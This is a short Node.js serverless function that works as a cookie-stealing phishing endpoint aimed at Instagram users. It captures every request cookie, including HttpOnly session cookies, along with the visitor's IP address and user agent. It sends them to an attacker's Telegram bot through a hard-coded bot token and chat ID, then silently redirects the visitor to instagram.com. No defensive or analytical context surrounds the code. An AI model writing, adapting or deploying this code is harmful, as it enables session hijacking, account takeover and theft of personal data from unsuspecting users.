const fetch = require('node-fetch');

const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

exports.handler = async (event, context) => {
    try {
        // 1. Get cookies from the request headers
        // This captures ALL cookies, including HttpOnly ones like sessionid
        const cookies = event.headers['cookie'] || "";

        // 2. Get metadata
        const timestamp = new Date().toISOString();
        const userAgent = event.headers['user-agent'] || "Unknown";
        const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown";

        // 3. Prepare Telegram Message
        const message = `
🍪 <b>ALL Instagram Cookies Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🍪 <b>ALL Cookies:</b>
<code>${cookies}</code>
        `;

        // 4. Send to Telegram
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            })
        });

        // 5. Redirect to Instagram
        return {
            statusCode: 302,
            headers: {
                Location: "https://www.instagram.com/"
            },
            body: ""
        };

    } catch (error) {
        console.error("Handler Error:", error);
        return {
            statusCode: 500,
            body: "Internal Server Error"
        };
    }
};
